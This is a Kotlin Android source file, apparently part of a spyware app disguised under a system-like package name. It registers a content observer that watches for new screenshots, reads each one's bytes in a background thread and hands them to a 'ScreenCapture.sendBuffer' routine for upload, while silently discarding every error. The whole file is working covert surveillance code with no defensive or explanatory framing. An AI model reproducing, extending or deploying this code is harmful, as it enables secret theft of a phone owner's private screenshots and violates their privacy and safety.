package com.system.service.monitor

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ScreenshotObserver(private val context: Context) : ContentObserver(Handler(Looper.getMainLooper())) {

    private var lastProcessedUri: Uri? = null

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        if (uri == null) return
        
        // Prevent processing the same URI multiple times rapidly
        if (uri == lastProcessedUri) return
        lastProcessedUri = uri

        try {
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(MediaStore.Images.Media.DATA),
                null,
                null,
                null
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    val path = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                    if (path != null && path.lowercase(Locale.ROOT).contains("screenshot")) {
                        // It's a screenshot!
                        uploadScreenshot(uri, path)
                    }
                }
            }
        } catch (_: Exception) { }
    }

    private fun uploadScreenshot(uri: Uri, path: String) {
        Thread {
            try {
                // Read the image bytes
                val inputStream: InputStream? = context.contentResolver.openInputStream(uri)
                val buffer = ByteArrayOutputStream()
                inputStream?.use {
                    var nRead: Int
                    val data = ByteArray(16384)
                    while (it.read(data, 0, data.size).also { nRead = it } != -1) {
                        buffer.write(data, 0, nRead)
                    }
                }
                
                val imageBytes = buffer.toByteArray()
                if (imageBytes.isNotEmpty()) {
                    val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                    ScreenCapture.sendBuffer(imageBytes, "Manual User Screenshot", ts)
                }
            } catch (_: Exception) { }
        }.start()
    }
}
